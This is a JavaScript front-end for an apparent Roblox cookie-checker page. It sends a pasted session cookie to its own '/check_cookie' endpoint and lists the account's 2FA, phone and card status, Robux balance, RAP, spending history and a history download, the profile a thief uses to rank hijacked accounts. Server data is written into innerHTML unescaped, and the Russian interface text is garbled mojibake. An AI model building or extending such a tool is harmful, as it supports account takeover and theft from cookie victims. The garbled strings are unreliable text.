document.addEventListener('DOMContentLoaded', function() {
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —á–∞—Å—Ç–∏—Ü
    particlesJS('particles-js', {
        particles: {
            number: { value: 80, density: { enable: true, value_area: 800 } },
            color: { value: "#ffffff" },
            shape: { type: "circle" },
            opacity: { value: 0.5, random: true },
            size: { value: 3, random: true },
            line_linked: {
                enable: true,
                distance: 150,
                color: "#ffffff",
                opacity: 0.2,
                width: 1
            },
            move: {
                enable: true,
                speed: 2,
                direction: "none",
                random: true,
                straight: false,
                out_mode: "out",
                bounce: false
            }
        },
        interactivity: {
            detect_on: "canvas",
            events: {
                onhover: { enable: true, mode: "repulse" },
                onclick: { enable: true, mode: "push" },
                resize: true
            }
        }
    });

    const checkButton = document.getElementById('checkButton');
    const cookieInput = document.getElementById('cookieInput');
    const resultSection = document.getElementById('resultSection');
    const errorSection = document.getElementById('errorSection');

    checkButton.addEventListener('click', checkCookie);

    async function checkCookie() {
        const cookie = cookieInput.value.trim();
        
        if (!cookie) {
            showError('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫—É–∫–∏');
            return;
        }

        showLoading(true);
        hideResults();

        try {
            const response = await fetch('/check_cookie', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ cookie: cookie })
            });

            const result = await response.json();

            if (result.error) {
                showError(result.error);
            } else {
                displayResults(result);
            }
        } catch (error) {
            showError('–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ' + error.message);
        } finally {
            showLoading(false);
        }
    }

    function displayResults(data) {
        // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
        document.getElementById('basicInfo').innerHTML = `
            <div class="info-item">
                <span>üë§ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</span>
                <span>${data.username || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</span>
            </div>
            <div class="info-item">
                <span>üÜî ID –∞–∫–∫–∞—É–Ω—Ç–∞:</span>
                <span>${data.account_id || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</span>
            </div>
            <div class="info-item">
                <span>üìÖ –î–∞—Ç–∞ —Å–æ–∑–¥–∞–Ω–∏—è:</span>
                <span>${data.account_created || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</span>
            </div>
            <div class="info-item">
                <span>üîó –°—Å—ã–ª–∫–∞ –Ω–∞ –ø—Ä–æ—Ñ–∏–ª—å:</span>
                <a href="${data.profile_link}" target="_blank" style="color: #48dbfb;">–û—Ç–∫—Ä—ã—Ç—å</a>
            </div>
        `;

        // –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å
        document.getElementById('securityInfo').innerHTML = `
            <div class="info-item">
                <span>üõ°Ô∏è 2FA:</span>
                <span class="status ${data['2fa'] ? 'positive' : 'negative'}">
                    ${data['2fa'] ? '–í–∫–ª—é—á–µ–Ω–æ' : '–í—ã–∫–ª—é—á–µ–Ω–æ'}
                </span>
            </div>
            <div class="info-item">
                <span>üì± –¢–µ–ª–µ—Ñ–æ–Ω:</span>
                <span class="status ${data.phone ? 'positive' : 'negative'}">
                    ${data.phone ? '–ü—Ä–∏–≤—è–∑–∞–Ω' : '–ù–µ –ø—Ä–∏–≤—è–∑–∞–Ω'}
                </span>
            </div>
            <div class="info-item">
                <span>üí≥ –ö–∞—Ä—Ç–∞:</span>
                <span class="status ${data.card ? 'positive' : 'negative'}">
                    ${data.card ? '–ü—Ä–∏–≤—è–∑–∞–Ω–∞' : '–ù–µ –ø—Ä–∏–≤—è–∑–∞–Ω–∞'}
                </span>
            </div>
            <div class="info-item">
                <span>üí∞ Billing:</span>
                <span class="status ${data.card ? 'positive' : 'negative'}">
                    ${data.card ? '–î–æ—Å—Ç—É–ø–µ–Ω' : '–ù–µ –¥–æ—Å—Ç—É–ø–µ–Ω'}
                </span>
            </div>
        `;

        // –≠–∫–æ–Ω–æ–º–∏–∫–∞
        document.getElementById('economyInfo').innerHTML = `
            <div class="info-item">
                <span>üíé –ë–∞–ª–∞–Ω—Å Robux:</span>
                <span style="color: #feca57; font-weight: bold;">${data.balance || 0}</span>
            </div>
            <div class="info-item">
                <span>‚è≥ Pending Robux:</span>
                <span>${data.pending_robux || 0}</span>
            </div>
            <div class="info-item">
                <span>üëë Premium:</span>
                <span class="status ${data.premium ? 'positive' : 'negative'}">
                    ${data.premium ? '–ê–∫—Ç–∏–≤–µ–Ω' : '–ù–µ –∞–∫—Ç–∏–≤–µ–Ω'}
                </span>
            </div>
            <div class="info-item">
                <span>üé® RAP:</span>
                <span class="status ${data.rap ? 'positive' : 'negative'}">
                    ${data.rap ? '–ï—Å—Ç—å' : '–ù–µ—Ç'}
                </span>
            </div>
            <div class="info-item">
                <span>üè¢ Group Pending:</span>
                <span>${data.pending_group_robux || 0}</span>
            </div>
            <div class="info-item">
                <span>üí∏ –í—Å–µ–≥–æ –ø–æ—Ç—Ä–∞—á–µ–Ω–æ:</span>
                <span>${data.total_spent || 0} Robux</span>
            </div>
        `;

        // –°–æ—Ö—Ä–∞–Ω—è–µ–º check_id –¥–ª—è —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
        if (data.check_id) {
            document.getElementById('downloadBtn').onclick = () => {
                window.location.href = `/download_history/${data.check_id}`;
            };
        }

        resultSection.classList.remove('hidden');
        errorSection.classList.add('hidden');
    }

    function showError(message) {
        document.getElementById('errorMessage').textContent = message;
        errorSection.classList.remove('hidden');
        resultSection.classList.add('hidden');
    }

    function hideResults() {
        resultSection.classList.add('hidden');
        errorSection.classList.add('hidden');
    }

    function showLoading(show) {
        const btnText = checkButton.querySelector('.btn-text');
        const loader = checkButton.querySelector('.btn-loader');
        
        if (show) {
            btnText.style.display = 'none';
            loader.style.display = 'block';
            checkButton.disabled = true;
        } else {
            btnText.style.display = 'block';
            loader.style.display = 'none';
            checkButton.disabled = false;
        }
    }
});